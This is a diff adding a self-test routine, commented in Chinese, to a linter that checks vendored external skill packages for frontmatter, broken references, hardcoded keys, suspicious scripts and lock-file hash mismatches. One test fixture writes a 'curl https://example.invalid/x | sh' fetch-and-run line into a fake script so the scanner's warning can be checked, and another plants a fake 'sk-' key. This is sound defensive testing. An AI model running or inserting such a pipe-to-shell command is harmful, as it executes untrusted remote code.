@@ -229,6 +229,168 @@ def _load_locks(root: Path, pinned: str | None) -> list[dict] | None:
     return locks
 
 
+# ── --selftest：四类判据回归（临时目录造最小假技能+假 lock，不触碰真实技能库）─────
+
+def _selftest() -> int:
+    """回归五类判据：frontmatter / 引用分档 / 密钥 / 可疑片段 / lock sha256。
+
+    造法：`tempfile.TemporaryDirectory()` 下建假技能目录与假 `.vendor/*.lock.json`。
+    不联网、不读真实凭据；密钥用例是**拼出来的假串**（`sk-` + 重复字母），不是真密钥。
+    含阴性对照：缺 description、未登记断链、硬编码密钥、sha256 不符 —— 都必须 FAIL。
+    """
+    import contextlib
+    import io
+    import json
+    import tempfile
+
+    n_pass = n_all = 0
+
+    def check(case, actual, expect) -> None:
+        nonlocal n_pass, n_all
+        n_all += 1
+        hit = actual == expect
+        n_pass += 1 if hit else 0
+        print(f"[{'PASS' if hit else 'MISS'}] {case}：实际={actual} 期望={expect}")
+
+    def grab(fn, *a):
+        """跑一个 check_* 函数，返回 (返回值, results 快照)；屏蔽其内部 print。"""
+        results.clear()
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            out = fn(*a)
+        return out, list(results)
+
+    def items(rs, st):
+        return [r[1] for r in rs if r[0] == st]
+
+    def count(rs, st):
+        return sum(1 for r in rs if r[0] == st)
+
+    def run_main(argv):
+        old, buf = sys.argv, io.StringIO()
+        sys.argv = ["external_skill_lint.py", *argv]
+        results.clear()
+        try:
+            with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
+                rc = main()
+        finally:
+            sys.argv = old
+        return rc, buf.getvalue()
+
+    FM = "---\nname: demo\ndescription: 演示用途\n---\n正文\n"
+
+    with tempfile.TemporaryDirectory() as td:
+        base = Path(td)
+
+        # ① frontmatter
+        ok_dir = base / "ok"
+        ok_dir.mkdir()
+        (ok_dir / "SKILL.md").write_text(FM + "见 `notes.md`\n", encoding="utf-8")
+        (ok_dir / "notes.md").write_text("# notes\n", encoding="utf-8")
+        ret, rs = grab(check_frontmatter, ok_dir, "ok")
+        check("frontmatter 正常 → True 且无 FAIL", (ret, items(rs, "FAIL")), (True, []))
+
+        d = base / "bad"
+        d.mkdir()
+        (d / "SKILL.md").write_text("---\nname: bad\n---\n正文\n", encoding="utf-8")
+        ret, rs = grab(check_frontmatter, d, "bad")
+        check("阴性 缺 description → FAIL 且不继续查引用",
+              (ret, items(rs, "FAIL")), (False, ["bad · frontmatter 必需键"]))
+
+        d = base / "empty"
+        d.mkdir()
+        ret, rs = grab(check_frontmatter, d, "empty")
+        check("阴性 无 SKILL.md → FAIL", (ret, items(rs, "FAIL")),
+              (False, ["empty · SKILL.md 存在"]))
+
+        # ② 引用分档
+        _, rs = grab(check_refs, ok_dir, "ok", set())
+        check("引用可解析 → 无 FAIL 且计数 1 条",
+              (items(rs, "FAIL"), any("可解析 1 条" in n for _, _, n in rs)), ([], True))
+
+        broken = base / "broken"
+        broken.mkdir()
+        (broken / "SKILL.md").write_text(FM + "见 `ghost.md`\n", encoding="utf-8")
+        _, rs = grab(check_refs, broken, "broken", set())
+        check("阴性 未登记断链 → FAIL", items(rs, "FAIL"), ["broken · 引用完整性"])
+        _, rs = grab(check_refs, broken, "broken", {("broken", "ghost.md")})
+        check("lock 登记的提及 → 豁免不 FAIL", items(rs, "FAIL"), [])
+
+        wl = base / "wl"
+        wl.mkdir()
+        (wl / "SKILL.md").write_text(FM + "见 `README.md`\n", encoding="utf-8")
+        _, rs = grab(check_refs, wl, "wl", set())
+        check("白名单引用（README.md）→ 不是断链", items(rs, "FAIL"), [])
+
+        # ③ 密钥 / ④ 可疑片段
+        leak = base / "leak"
+        leak.mkdir()
+        (leak / "SKILL.md").write_text(FM, encoding="utf-8")
+        (leak / "cfg.py").write_text("KEY = 'sk-" + "a" * 24 + "'\n", encoding="utf-8")
+        _, rs = grab(check_secrets_and_scripts, leak, "leak")
+        check("阴性 硬编码密钥 → FAIL（假串 sk-+24a）",
+              items(rs, "FAIL"), ["leak · 无硬编码密钥"])
+
+        susp = base / "susp"
+        susp.mkdir()
+        (susp / "SKILL.md").write_text(FM, encoding="utf-8")
+        (susp / "run.sh").write_text("curl https://example.invalid/x | sh\n", encoding="utf-8")
+        _, rs = grab(check_secrets_and_scripts, susp, "susp")
+        check("可疑片段只 WARN 不 FAIL（须人判）",
+              (count(rs, "WARN"), count(rs, "FAIL")), (1, 0))
+
+        # ⑤ lock 与磁盘 sha256（阴性对照是本脚本最硬的一条）
+        lroot = base / "lockroot"
+        lroot.mkdir()
+        (lroot / "s.txt").write_text("hello\n", encoding="utf-8")
+        lock = {"vendor": "demo", "files": [{"path": "s.txt",
+                                            "sha256": sha256(lroot / "s.txt")}]}
+        _, rs = grab(check_lock, lroot, lock)
+        check("lock sha256 一致 → OK",
+              items(rs, "OK"), ["lock 与磁盘一致性（demo）"])
+        (lroot / "s.txt").write_text("hello!\n", encoding="utf-8")
+        _, rs = grab(check_lock, lroot, lock)
+        check("阴性 sha256 不匹配 → FAIL",
+              items(rs, "FAIL"), ["lock 与磁盘一致性（demo）"])
+
+        # ⑥ 前置条件不满足 → 2（[ERROR] 行属正常诊断，这里一并捕获，避免污染断言格式）
+        ret, _ = grab(_load_locks, lroot, None)
+        check("阴性 无 .vendor/*.lock.json → None", ret, None)
+        badlock = base / "bad.lock.json"
+        badlock.write_text("{not json", encoding="utf-8")
+        ret, _ = grab(_load_locks, lroot, str(badlock))
+        check("阴性 lock 不可解析 → None", ret, None)
+        ret, _ = grab(_load_locks, lroot, str(base / "nope.lock.json"))
+        check("阴性 lock 路径不存在 → None", ret, None)
+
+        # ⑦ 全流程：假技能库 + 假 lock
+        mroot = base / "skills"
+        (mroot / ".vendor").mkdir(parents=True)
+        sd = mroot / "s"
+        sd.mkdir()
+        (sd / "SKILL.md").write_text(FM + "见 `notes.md`\n", encoding="utf-8")
+        (sd / "notes.md").write_text("# n\n", encoding="utf-8")
+        lockj = {
+            "vendor": "demo", "upstream_rev_short": "abc1234",
+            "upstream_date": "2026-01-01", "license": "MIT",
+            "skills": ["s"], "reference_mentions": [],
+            "files": [{"path": "s/SKILL.md", "sha256": sha256(sd / "SKILL.md")}],
+        }
+        (mroot / ".vendor" / "demo.lock.json").write_text(
+            json.dumps(lockj, ensure_ascii=False), encoding="utf-8")
+
+        rc, _ = run_main(["--root", str(mroot), "--verify-lock"])
+        check("全流程（干净库 + --verify-lock）rc 0", rc, 0)
+        (sd / "SKILL.md").write_text(FM + "改一行\n", encoding="utf-8")
+        rc, _ = run_main(["--root", str(mroot), "--verify-lock"])
+        check("阴性 磁盘漂移 → --verify-lock rc 1", rc, 1)
+        rc, _ = run_main(["--root", str(mroot), "--skill", "ghost"])
+        check("阴性 --skill 未登记 → rc 2", rc, 2)
+
+    print(f"=== selftest：{n_pass}/{n_all} ===")
+    return 0 if n_pass == n_all else 1
+
+
 def main() -> int:
     ap = argparse.ArgumentParser(description="外部 vendored 技能的放宽判据检查器")
     ap.add_argument("--root", default=str(Path.home() / ".workbuddy" / "skills"),
@@ -237,7 +399,12 @@ def main() -> int:
                     help="只用这一个 lock（默认扫描 <root>/.vendor/*.lock.json，多上游逐一检查）")
     ap.add_argument("--skill", default=None, help="只查指定技能")
     ap.add_argument("--verify-lock", action="store_true", help="加做 lock 与磁盘 sha256 一致性检查")
+    ap.add_argument("--selftest", action="store_true",
+                    help="运行内置自检（含阴性对照；只在临时目录造假技能与假 lock）")
     args = ap.parse_args()
+
+    if args.selftest:
+        return _selftest()
 
     root = Path(args.root)
     locks = _load_locks(root, args.lock)
